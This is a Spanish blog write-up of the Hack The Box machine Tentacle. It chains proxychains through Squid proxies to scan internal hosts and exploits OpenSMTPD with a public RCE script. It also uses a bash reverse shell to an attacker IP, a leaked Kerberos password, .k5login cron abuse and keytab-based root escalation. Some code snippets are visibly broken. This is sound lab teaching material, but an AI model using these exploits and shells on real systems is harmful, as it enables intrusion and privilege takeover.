---
layout: post
title: HTB_Tentacle
date: 2023/07/10
slug: HTB_Tentacle
heroImage: /assets/machines.jpg
---

# Tentacle {-}

## Introduccion {-}

La maquina del dia se llama Tentacle.

El replay del live se puede ver aqui

[![S4vitaar Tentacle maquina](https://img.youtube.com/vi/hFIWuWVIDek/0.jpg)](https://www.youtube.com/watch?v=hFIWuWVIDek)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.224
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.224
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.224 -oG allPorts 
extractPorts allPorts
nmap -sCV -p22,53,88,3128 10.10.10.224 -oN targeted
```


| Puerto | Servicio         | Que se nos occure?    | Que falta? |
| ------ | ---------------- | --------------------- | ---------- |
| 22     | ssh              | Coneccion directa     |            |
| 53     | domain           |                       |            |
| 88     | Kerberos         | kerberoastable attack | usuario    |
| 3128   | http squid proxy | Fuzzing               |            |


### Analyzando el servicio Squid Proxy {-}

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.224:3128 
```
. Vemos una pagina de error y podemos ver que el administrador es **j.nakazawa@realcorp.htb**. Tambien al fondo
de la pagina vemos un dominio 
```bash
 srv01.realcorp.htb 
```
. Lo añadimos al 
```bash
 /etc/hosts 
```
.

### Checkeo del dominio {-}

```bash
dig @10.10.10.224 realcorp.htb
dig @10.10.10.224 realcorp.htb ns
dig @10.10.10.224 realcorp.htb mx
dig @10.10.10.224 realcorp.htb axfr
```

Podemos ver en los nameservers que el dominio **ns.realcorp.htb** apunta a la ip 
```bash
 10.197.243.77 
```
.

### Enumeracion de puertos con Squid Proxy {-}

El uso de un *Squid Proxy* nos hace pensar como atacante que podemos con el uso de **proxychain** enumerar puertos internos de la 
maquina victima.

Añadimos los datos del *squid proxy* al final de nuestro fichero 
```bash
 /etc/proxychains.conf 
```


```bash
http    10.10.10.224    3128
```

Desde aqui, podemos scanear la maquina con un **NMAP TCP connect scan**


```bash
proxychains nmap -sT -Pn -v -n 127.0.0.1
```

Aqui vemos que pasamos por el *Squid Proxy* para enumerar los puertos internos de la maquina victima. Como se ve muchos **(denied)** añadimos
el modo quiet al scaneo

```bash
proxychains -q nmap -sT -Pn -v -n 127.0.0.1
```

Vemos nuevos puertos como los 749 y 464. Como el servicio **DNS** esta abierto, podemos transmitar consultas DNS con **dnsenum**.

*** Enumeracion DNS con dnsenum {-}

Aqui utilizaremos fuerza bruta para enumerar mas subdominios.

```bash
dnsenum --dnsserver 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
```

Aqui vemos nuevos dominios

- ns.realcorp.htb -> 10.197.243.77
- proxy.realcorp.htb -> ns.realcorp.htb
- wpad.realcorp.htb -> 10.197.243.31

Añadimos los dominios al 
```bash
 /etc/hosts 
```
 con las mismas ip. Como pasamos por proxychains, podemos intentar enumerar puertos de estas ip.

```bash
proxychains -q nmap -sT -Pn -v -n 10.197.243.77
```

Aqui vemos que no podemos enumerar nada asin.


### Enumeracion de puertos de ips internas burlando el squid proxy {-}

Para explicar la movida vamos a utilizar imagenes.

Como nuestra configuracion proxychains esta echa con el comando 

```bash
http    10.10.10.224    3128
```

esto resulta en lo siguiente.



![Tetacle-ormal-roxychais-cof](/assets/images/Tentacle-normal-proxychains-conf.png) 
Pasamos por internet para con el Squid Proxy scanear el 10.197.243.77. Pensamos que es un **Internal Squid Proxy** porque el dominio es 

```bash
 proxy.realcorp.htb 
```
. Hemos podido comprobar que esta tecnica no funcciona.

Lo que queremos hacer es uzar otra configuracion del proxychains para que pasemos por el Squid Proxy hacia la interface interna del puerto 3128
de este mismo Squid Proxy.
pero de manera local para poder scanear el **Internal Squid Proxy**.



```{r, echo = FALSE, fig.cap="isp proxychains", out.width="90%"}
    knitr::include_graphics("images/Tentacle-isp-proxychains-conf.png")

![Tetacle-is-roxychais-cof](/assets/images/Tentacle-isp-proxychains-conf.png) 
```bash
http    10.10.10.224    3128
http    127.0.0.1   3128
```

> [ ! ] Notas: cuidado con el -Pn del tito ;)


Ahora ya podemos intentar de scanear los puertos de la ip interna.

```bash
proxychains -q nmap -sT -Pn -v -n 10.197.243.77
```

Ya vemos que podemos encontrar puertos. Como el nmap va lento, Tito nos muestra como crear un scaner con bash

```bash
#!/bin/bash

for prot in $(seq 1 65535); do
        proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.77/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

Como no vemos nigun puerto interesante vamos a intentar con la misma tecnica scanear otros sercios como el 
```bash
 wpad.realcorp.htb 
```


```{r, echo = FALSE, fig.cap="internal servers scanning", out.width="90%"}
    knitr::include_graphics("images/Tentacle-otherserv-proxychains-conf.png")
```

```bash
![Tetacle-otherserv-roxychais-cof](/assets/images/Tentacle-otherserv-proxychains-conf.png) 
#!/bin/bash

for prot in $(seq 1 65535); do
        proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.31/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

como no funcciona, esto significa que tenemos que modificar nuestro 
```bash
 /etc/proxychains.conf 
```
 para pasar tambien por el squid proxy interno.

```bash
http    10.10.10.224    3128
http    127.0.0.1   3128
http    10.197.243.77 3128
```

Si lanzamos el commando 
```bash
 proxychains nmap -sT -Pn -v -n 10.197.243.31 -p22 
```
 podemos ver lo siguiente.

```{r, echo = FALSE, fig.cap="Proxychains chain", out.width="90%"}
    knitr::include_graphics("images/Tentacle-proxychains-chain.png")
```

Aqui podemos ver que el puerto esta abierto pero lo mas interesante es el *Strict chain* y vemos que pasamos por la 
10.10.10.224:3128 hacia el 127.0.0.1:3128 de esta misma maquina para despues pasar por la 10.197.243.77:3128 que es el 

![Tetacle-roxychais-chai](/assets/images/Tentacle-proxychains-chain.png) 
### Analysis de la web interna con proxychains {-}

podemos connectarnos a la web con el commando siguiente.

```bash
proxychains -q curl -s http://wpad.realcorp.htb
```

Aqui vemos que nos da un **403 Forbidden**. Como el dominio se llama wpad, miramos por google si encontramos una vulnerabilidad relacionado con esto.
Como ya es algo que hemos visto en el canal, pasamos directamente por [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad).

La pagina nos dice que muchos buscadores utilizan wpad que es *Web Proxy Auto-Discovery* para cargar configuraciones de proxy a nivel de red. Tambien
nos dice que los servidores WPAD proporcionan configuraciones de proxy a nivel de PATH URL (e.g., http://wpad.example.org/wpad.dat).

Miramos si este wpad.dat existe

```bash
proxychains -q curl -s http://wpad.realcorp.htb/wpad.dat | batcat -l js
```

y si, existe y podemos ver lo siguiente

```{r, echo = FALSE, fig.cap="wpad.dat", out.width="90%"}
    knitr::include_graphics("images/Tentacle-wpad-dat.png")
```

Aqui vemos un nuevo rango de ip 
```bash
 10.241.251.0 255.255.255.0 
```
 que no teniamos antes. El problema es que proxychains no tiene el binario ping configurado para
este uso. Tenemos que pasar nuevamente por un script en bash.

```bash
        for i in $(seq 1 254); do
![Tetacle-wad-dat](/assets/images/Tentacle-wpad-dat.png) 
            proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>/dev/null && echo "[+] $port - OPEN on host $i" &
        done; wait
done; 
```

lanzando el script vemos algo que nos llama la atencion que es el puerto 25 abierto en el host 10.241.251.113. Lanzamos nmap para saber la version
y servicio que corre para este puerto.

```bash
proxychains nmap -sT -Pn -p25 -sCV 10.241.251.113
```

Podemos ver que es un **OpenSMTPD 2.0.0**
## Vulnerability Assessment {-}

### OpenSMTPD 2.0.0 {-}

Buscamos si existe exploit para este servicio

```bash
searchsploit opensmtpd
```

vemos que existe un exploit de typo RCE para la version 6.6.1. Como tenemos la version 2.0.0 pensamos que se puede utilizar.

```bash
searchsploit -m 47984
mv 47984.py smtpd-exploit.py
cat smtpd-exploit.py
```

Viendo el codigo vemos que necessita una ip un puerto y un commando. Vemos que utilza un servicio mail para enviar el comando
a un recipiant que es root. Intentamos lanzarlo tal cual.

1. Nos creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos el script con proxychains

    ```bash
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.29'
    ```


Aqui vemos que no funcciona. puede ser porque el usuario root de este servicio no existe. Recordamos que hemos encontrado un email.
Tratamos de modificar el recipient para cambiar el root por j.nakazawa. Como el puerto 88 esta abierto primero utilizamos kerbrute para saber
si el usuario j.nakazawa existe.

1. creamos un fichero de usuarios y pegamos el usuario j.nakasawa
1. enumeramos usuarios con kerbrute

    ```bash
    kerbrute userenum --dc 10.10.10.224 -d realcorp.htb users
    ```

vemos que el usuario es valido. En el exploit, cambiamos el 
```bash
 s.send(b'RCPT TO:<root>\r\n') 
```
 por 
```bash
 s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n') 
```
 y lanzamos 
nuevamente el exploit. Vemos que tenemos un GET en nuestro servidor web lo que significa que podemos ejecutar comandos y que tenemos conectividad con esta
maquina.## Vuln exploit & Gaining Access {-}

### Ganando acceso con el exploit opensmtpd {-}

1. creamos un ficher index.html que contiene

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.29/443 0>&1
    ```

1. lanzamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. lanzamos el exploit desde proxychains

    ```bash
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.29 -O /dev/shm/rev
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'bash /dev/shm/rev
    ```

Ya hemos ganado acceso al contenedor como root.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```


Aqui ya miramos si podemos leer la flag pero no es el caso. Vemos un fichero 
```bash
 .msmtprc 
```
 en el directorio home del usuario j.nakazawa

```bash
cd /home/j.nakazawa
cat .msmtprc
```

Podemos ver una contraseña. Intentamos connectarnos por ssh a la maquina victima pero la credenciales no son validas. Ademas podemos ver
un mensaje de error un poco raro que habla de GSSAPI-With-MIC. Buscando por internet vemos que el servicio de authentification del ssh
esta usando authenticacion Kerberos.

### Configuracion de krb5 {-}

```bash
apt install krb5-user
dpkg-reconfigure krb5-config

Reino predeterminado de la version5 de Kerberos: REALCORP.HTB
Añadir las config en el ficher /etc/krb5.conf: Si
Servidores de Kerberos para su reino: 10.10.10.224
Servidor administrativo para su reino: 10.10.10.224
```

Aqui podemos modificar el fichero 
```bash
 /etc/krb5.conf 
```
 de configuracion para tener lo siguiente

```bash
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }

[domain_realm]
        .REALCORP.HTB = REALCORP.HTB
        REALCORP.HTB = REALCORP.HTB

```

Cacheamos las credenciales del usuario al kerberos con el commando

```bash
> kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
```

Vemos que un fichero 
```bash
 /tmp/krb5cc_0 
```
 a sido creado y ahora podemos connectar por ssh 

```bash
ssh j.nakazawa@10.10.10.224
```

Ya estamos en la maquina 10.10.10.224 y podemos leer la flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
cat /etc/crontab
```

Aqui vemos que hay una tarea que se ejecuta por el usuario admin cada minuto. El script es 
```bash
 /usr/local/bin/log_backup.sh 
```

Este archivo basicamente copia lo que hay en el directorio 
```bash
 /var/log/squid 
```
 en el directorio 
```bash
 /home/admin 
```
.

```bash
cd /home/admin
cd /var/log/
ls -la | grep squid
```

Vemos que podemos escribir en el /var/log/squid pero no podemos entrar en el /home/admin.

Buscando por internet, vemos que existe un fichero que se puede poner en el directorio del usuario y que permite dar
conneccion con kerberos. Este fichero seria .k5login.


```bash
cd /var/log/squid/
echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

Esperamos un poco y lanzamos desde nuestra maquina de atacante una conneccion ssh

```bash
ssh admin@10.10.10.224
```

Ahora que estamos conectados como admin miramos como nos podemos pasar a root


```bash
cd /
find / -type f -user admin 2>/dev/null
find / -type f -user admin 2>/dev/null | grep -v "proc"
find / -type f -user admin 2>/dev/null | grep -v -E "proc|cgroup"
find / -type f -group admin 2>/dev/null | grep -v -E "proc|cgroup"
```

Encontramos un fichero 
```bash
 /etc/krb5.keytab 
```


```bash
cat /etc/krb5.keytab
file /etc/krb5.keytab
```

Si buscamos lo que es por internet vemos que hay una via potencial de rootear esta maquina usando este fichero. La idea aqui seria
de crear un nuevo principal al usuario root cambiandole la contraseña.

```bash
klist -k /etc/krb5.keytab
kadmin -h
kadmin -kt /etc/krb5.keytab
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
?
addprinc root@REALCORP.HTB
password: test123
reenter password: test123
exit
```

Si ahora lanzamos 

```bash
ksu
Kerberos password for root@REALCORP.HTB: test123
whoami

#Output
root
```

Ya somos root y podemos leer la flag
